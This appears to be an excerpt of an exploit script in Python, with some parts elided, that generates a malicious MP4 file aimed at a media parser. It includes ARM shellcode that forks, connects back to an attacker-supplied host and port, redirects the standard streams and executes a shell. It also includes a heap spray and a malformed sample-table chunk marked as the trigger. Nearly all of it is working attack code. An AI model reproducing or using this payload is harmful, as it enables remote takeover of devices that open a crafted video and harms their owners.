...
def build_rop(off, sp_addr, newpc_val, cb_host, cb_port):
    ...
    buf =  b''
    # fork
    buf += b'\x02\x70\xa0\xe3'
    buf += b'\x00\x00\x00\xef'
    # continue if not parent...
    buf += b'\x00\x00\x50\xe3'
    buf += b'\x02\x00\x00\x0a'
    # exit parent
    buf += b'\x00\x00\xa0\xe3'
    buf += b'\x01\x70\xa0\xe3'
    buf += b'\x00\x00\x00\xef'
    # setsid in child
    buf += b'\x42\x70\xa0\xe3'
    buf += b'\x00\x00\x00\xef'
    # socket/connect/dup2/dup2/dup2
    buf += b'\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c'
    buf += b'\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60'
    buf += b'\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0'
    buf += b'\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1'
    buf += b'\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06'
    buf += b'\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00'
    buf += b'\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0'
    buf += b'\xe3\x00\x00\x00\xef'
    # execve(shell, argv, env)
    buf += b'\x30\x00\x8f\xe2\x04\x40\x24\xe0'
    buf += b'\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d'
    buf += b'\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00'
    buf += b'\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00'
    buf += b'\xef\x02\x00'
...
def create_mp4(sp_addr, newpc_val, cb_host, cb_port):
    ...
    spray = page * (round((2*1024*1024) / len(page)) - 20)
    ...
    udta = make_chunk('udta',
        make_chunk('meta',
            struct.pack('>L', 0) +
            make_chunk('ilst',
                make_chunk('cpil',    make_chunk('data', struct.pack('>LL', 21, 0) + b'A')) +
                make_chunk('trkn',    make_chunk('data', struct.pack('>LL', 0, 0) + b'AAAABBBB')) +
                make_chunk('disk',    make_chunk('data', struct.pack('>LL', 0, 0) + b'AAAABB')) +
    ...
    stbl1 = make_stsc(3, round(0x1200 / 0xc) - 1, sp_addr, True) # TRIGGER
